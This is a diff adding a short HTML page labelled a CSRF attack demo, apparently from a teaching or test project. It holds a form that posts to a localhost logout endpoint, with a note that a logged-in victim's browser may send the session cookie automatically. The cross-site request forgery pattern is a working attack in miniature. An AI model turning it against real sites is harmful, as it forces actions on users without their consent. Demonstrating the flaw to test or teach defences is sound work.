@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Attack Demo</title>
+</head>
+<body>
+  <h2>Fake Attack Page</h2>
+  <p>This page attempts to force a logout request.</p>
+
+  <form id="attackForm" method="POST" action="http://localhost:3000/auth/logout">
+    <button type="submit">Launch CSRF Attack</button>
+  </form>
+
+  <p>
+    Without CSRF protection, if a victim is logged in and visits this page,
+    the browser may send the session cookie automatically.
+  </p>
+
+  <a href="/">Back</a>
+</body>
+</html>
